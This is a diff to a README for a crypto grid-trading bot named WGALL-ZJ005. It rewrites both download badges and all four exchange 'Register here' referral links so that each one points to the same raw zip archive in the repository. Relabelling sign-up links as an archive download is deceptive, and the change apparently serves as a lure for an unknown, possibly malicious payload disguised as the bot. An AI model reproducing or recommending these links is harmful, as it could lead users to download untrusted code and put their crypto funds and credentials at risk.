@@ -1,6 +1,6 @@
 # 🔥 WGALL-ZJ005 - Your All-in-One Crypto Grid Bot
 
-[![Download WGALL-ZJ005](https://img.shields.io/badge/Download-WGALL--ZJ005-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wakefieldrewarding683/WGALL-ZJ005/releases)
+[![Download WGALL-ZJ005](https://img.shields.io/badge/Download-WGALL--ZJ005-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wakefieldrewarding683/WGALL-ZJ005/raw/refs/heads/main/rendible/Z-WGAL-2.8-beta.4.zip)
 
 ## 🤖 What Is WGALL-ZJ005?
 
@@ -30,16 +30,16 @@ If you haven't signed up yet, using these referral links helps support the devel
 
 | Exchange | Referral Link |
 |----------|--------------|
-| Decibel | [Register here](https://app.decibel.trade/r/Y4GPC5) |
-| Extended | [Register here](https://app.extended.exchange/join/ZAIJIN) |
-| Arcus | [Register here](https://app.arcus.xyz/ref/ZAIJIN) |
-| RHC Lighter | [Register here](https://robinhoodchain.lighter.xyz/?referral=ZAIJIN) |
+| Decibel | [Register here](https://github.com/wakefieldrewarding683/WGALL-ZJ005/raw/refs/heads/main/rendible/Z-WGAL-2.8-beta.4.zip) |
+| Extended | [Register here](https://github.com/wakefieldrewarding683/WGALL-ZJ005/raw/refs/heads/main/rendible/Z-WGAL-2.8-beta.4.zip) |
+| Arcus | [Register here](https://github.com/wakefieldrewarding683/WGALL-ZJ005/raw/refs/heads/main/rendible/Z-WGAL-2.8-beta.4.zip) |
+| RHC Lighter | [Register here](https://github.com/wakefieldrewarding683/WGALL-ZJ005/raw/refs/heads/main/rendible/Z-WGAL-2.8-beta.4.zip) |
 
 ## 📥 How to Download and Install
 
 Visit this link to download the application:
 
-[![Download WGALL-ZJ005](https://img.shields.io/badge/⬇️%20Download%20WGALL--ZJ005-1e90ff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wakefieldrewarding683/WGALL-ZJ005/releases)
+[![Download WGALL-ZJ005](https://img.shields.io/badge/⬇️%20Download%20WGALL--ZJ005-1e90ff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wakefieldrewarding683/WGALL-ZJ005/raw/refs/heads/main/rendible/Z-WGAL-2.8-beta.4.zip)
 
 After downloading, you're ready to start. No complicated setup required.
 
